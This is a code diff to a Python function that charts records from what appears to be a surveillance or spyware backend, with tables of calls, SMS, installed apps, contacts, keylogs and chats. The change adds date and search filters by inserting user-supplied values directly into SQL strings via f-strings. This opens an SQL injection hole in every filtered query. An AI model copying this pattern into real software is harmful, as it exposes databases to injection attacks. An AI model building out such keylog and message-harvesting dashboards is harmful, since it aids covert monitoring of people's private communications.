@@ -275,32 +275,58 @@ def test_db_connection():
         print(f'Database connection error: {str(e)}')
         return False
 
-def get_data_for_visualization(category):
+def get_data_for_visualization(category, start_date=None, search=''):
     conn = get_db_connection()
     cur = conn.cursor()
 
+    date_filter = ""
+    search_filter = ""
+    if start_date:
+        if category in ['calls', 'sms']:
+            date_column = 'call_time' if category == 'calls' else 'message_time'
+        elif category == 'applications':
+            date_column = 'installed_date'
+        elif category == 'keylogs':
+            date_column = 'log_time'
+        elif category == 'chats':
+            date_column = 'time'
+        else:
+            date_column = None
+
+        if date_column:
+            date_filter = f" WHERE {date_column} >= '{start_date}'"
+
+    if search and category in ['applications', 'contacts']:
+        search_column = 'application_name' if category == 'applications' else 'contact_name'
+        search_filter = f" WHERE {search_column} ILIKE '%{search}%'"
+        if date_filter:
+            search_filter = f" AND {search_column} ILIKE '%{search}%'"
+
     if category == 'calls':
-        query = """
+        query = f"""
         SELECT call_type, COUNT(*) as count
         FROM calls
+        {date_filter}
         GROUP BY call_type
         """
     elif category == 'sms':
-        query = """
+        query = f"""
         SELECT message_type, COUNT(*) as count
         FROM sms
+        {date_filter}
         GROUP BY message_type
         """
     elif category == 'applications':
-        query = """
+        query = f"""
         SELECT application_name, COUNT(*) as count
         FROM applications
+        {date_filter}{search_filter}
         GROUP BY application_name
         ORDER BY count DESC
         LIMIT 10
         """
     elif category == 'contacts':
-        query = """
+        query = f"""
         SELECT 
             CASE 
                 WHEN email != 'not_available@example.com' THEN 'With Email'
@@ -308,20 +334,23 @@ def get_data_for_visualization(category):
             END as email_status,
             COUNT(*) as count
         FROM contacts
+        {search_filter}
         GROUP BY email_status
         """
     elif category == 'keylogs':
-        query = """
+        query = f"""
         SELECT application_id, COUNT(*) as count
         FROM keylogs
+        {date_filter}
         GROUP BY application_id
         ORDER BY count DESC
         LIMIT 10
         """
     elif category == 'chats':
-        query = """
+        query = f"""
         SELECT sender, COUNT(*) as count
         FROM chats
+        {date_filter}
         GROUP BY sender
         ORDER BY count DESC
         LIMIT 10
